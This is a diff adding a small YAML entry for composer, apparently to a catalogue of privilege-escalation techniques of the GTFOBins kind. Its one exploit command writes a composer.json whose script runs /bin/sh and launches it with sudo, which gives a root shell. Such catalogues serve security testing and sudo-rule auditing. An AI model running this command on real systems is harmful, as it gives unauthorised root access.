@@ -1,0 +1,5 @@
+name: composer
+binary_path: /usr/bin/composer
+exploit_cmds:
+- echo '{"scripts":{"x":"/bin/sh"}}' >composer.json && sudo /usr/bin/composer run-script
+  x
